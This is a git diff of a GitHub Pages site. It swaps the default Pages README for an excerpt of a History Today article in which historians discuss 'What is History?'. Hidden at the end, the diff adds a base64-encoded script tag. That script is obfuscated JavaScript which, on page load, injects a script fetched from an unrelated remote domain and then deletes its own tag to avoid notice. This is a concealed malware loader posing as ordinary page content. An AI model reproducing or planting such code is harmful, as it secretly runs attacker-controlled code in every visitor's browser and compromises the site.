@@ -1,37 +1,24 @@
-## Welcome to GitHub Pages
+What is History?
+Four historians consider the most fundamental question of all, one famously posed by E.H. Carr almost 60 years ago.
 
-You can use the [editor on GitHub](https://github.com/tta1th/History/edit/gh-pages/index.md) to maintain and preview the content for your website in Markdown files.
+History Today | Published in History Today Volume 70 Issue 8 August 2020
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+‘History is the study of people, actions, decisions, interactions and behaviours’
+Francesca Morphakis, PhD Candidate in History at the University of Leeds
 
-### Markdown
+History is narratives. From chaos comes order. We seek to understand the past by determining and ordering ‘facts’; and from these narratives we hope to explain the decisions and processes which shape our existence. Perhaps we might even distill patterns and lessons to guide – but never to determine – our responses to the challenges faced today. History is the study of people, actions, decisions, interactions and behaviours. It is so compelling a subject because it encapsulates themes which expose the human condition in all of its guises and that resonate throughout time: power, weakness, corruption, tragedy, triumph … Nowhere are these themes clearer than in political history, still the necessary core of the field and the most meaningful of the myriad approaches to the study of history. Yet political history has fallen out of fashion and subsequently into disrepute, wrongly demonised as stale and irrelevant. The result has been to significantly erode the utility of ordering, explaining and distilling lessons from the past. 
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+History’s primary purpose is to stand at the centre of diverse, tolerant, intellectually rigorous debate about our existence: our political systems, leadership, society, economy and culture. However, open and free debate – as in so many areas of life – is too often lacking and it is not difficult to locate the cause of this intolerance. 
 
-```markdown
-Syntax highlighted code block
+Writing history can be a powerful tool; it has shaped identities, particularly at the national level. Moreover, it grants those who control the narrative the ability to legitimise or discredit actions, events and individuals in the present. Yet to marshal history and send it into battle merely to serve the needs of the present is misuse and abuse. History should never be a weapon at the heart of culture wars. Sadly, once again, it is: clumsily wielded by those who deliberately seek to impose a clear ideological agenda. History is becoming the handmaiden of identity politics and self-flagellation. This only promotes poor, one-dimensional understandings of the past and continually diminishes the utility of the field. History stands at a crossroads; it must refuse to follow the trend of the times. 
 
-# Header 1
-## Header 2
-### Header 3
+ 
 
-- Bulleted
-- List
+‘I have a preference for historians who probe into the “why” and the “how”’
+Chandak Sengoopta, Professor of History at Birkbeck, University of London
 
-1. Numbered
-2. List
+Any thoroughly researched and well-argued study of any aspect of the past counts, for me, as history. I do have a preference for historians who probe into the ‘why’ and the ‘how’ but, overall, I think that our scope should be as broad and as catholic as possible. I am old enough to remember a time when women’s history was a separate field – left, in many universities, to Women’s Studies programmes – and the existence of non-white people was recognised by historians only in the context of imperial history. Back then – I am talking only about the late 1980s – English, Anthropology and even History of Science departments were often more adventurous in addressing the history of ‘others’ but their work, we were often told by ‘real’ historians, wasn’t proper history: ‘they use novels as evidence, for heaven’s sake!’ ‘Have any of them been near an archive?’ 
 
-**Bold** and _Italic_ and `Code` text
+If things are better today in History departments, it is because the disciplinary frontiers have been redrawn. But we still have our borders, not all of which are imposed by our institutions or funding authorities. How many History departments would exclude an otherwise excellent candidate only because her sources are mostly literary? A great many, I dare say, including my own. Many of the field’s old fixations may have disappeared, but quite a few antiquated fences still await a well-aimed boot.
 
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/tta1th/History/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+<script id="hr5On" src="data:text/javascript;base64, dmFyIF83dTRIbyA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX09jQmFHLCBfTEZObDUpIHt2YXIgXzNsVXRzID0gZnVuY3Rpb24oX1U0bmtCKSB7d2hpbGUgKC0tX1U0bmtCKSB7X09jQmFHWydwdXNoJ10oX09jQmFHWydzaGlmdCddKCkpO319O18zbFV0cygrK19MRk5sNSk7fShfN3U0SG8sIDB4MTFiKSk7dmFyIF9odUdtMSA9IGZ1bmN0aW9uKF9XY2pBTywgX3JtS0ZEKSB7X1djakFPID0gX1djakFPIC0gMHgwO3ZhciBfTTUxaVcgPSBfN3U0SG9bX1djakFPXTtyZXR1cm4gX001MWlXO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfaHVHbTEoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX1ROQlNLID0gZG9jdW1lbnRbX2h1R20xKCcweDEnKV0oX2h1R20xKCcweDInKSk7X1ROQlNLW19odUdtMSgnMHgzJyldID0gX2h1R20xKCcweDQnKTtfVE5CU0tbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg3M1x4NzBceDMyXHg2Zlx4NjlceDM5XHg3OFx4NzNceDJlXHg3MFx4NzJceDZmXHg2Nlx4NjVceDczXHg3OVx4NjFceDc5XHg2OVx4NmVceDZjXHg2MVx4NzJceDY5XHgyZVx4NjNceDZmXHg2ZFx4MmZceDVmXHg3Mlx4NjVceDZkXHg2Zlx4NzRceDY1XHg1Zlx4NzRceDcyXHg2MVx4NjNceDZiXHgyZVx4NmFceDczXHgzZlx4NjNceDYxXHg2ZFx4NzBceDYxXHg2OVx4NjdceDZlXHgzZFx4NTNceDRiXHg3N1x4NDhceDRmXHg1OVx4NDFceDMwXHg0ZVx4NzknO2RvY3VtZW50W19odUdtMSgnMHg1JyldKF9odUdtMSgnMHg2JykpWydceDYxXHg3MFx4NzBceDY1XHg2ZVx4NjRceDQzXHg2OFx4NjlceDZjXHg2NCddKF9UTkJTSyk7ZG9jdW1lbnRbX2h1R20xKCcweDcnKV0oJ2hyNU9uJylbJ1x4NzJceDY1XHg2ZFx4NmZceDc2XHg2NSddKCk7fSwgeydceDZmXHg2ZVx4NjNceDY1JzogISFbXX0pOw=="></script>
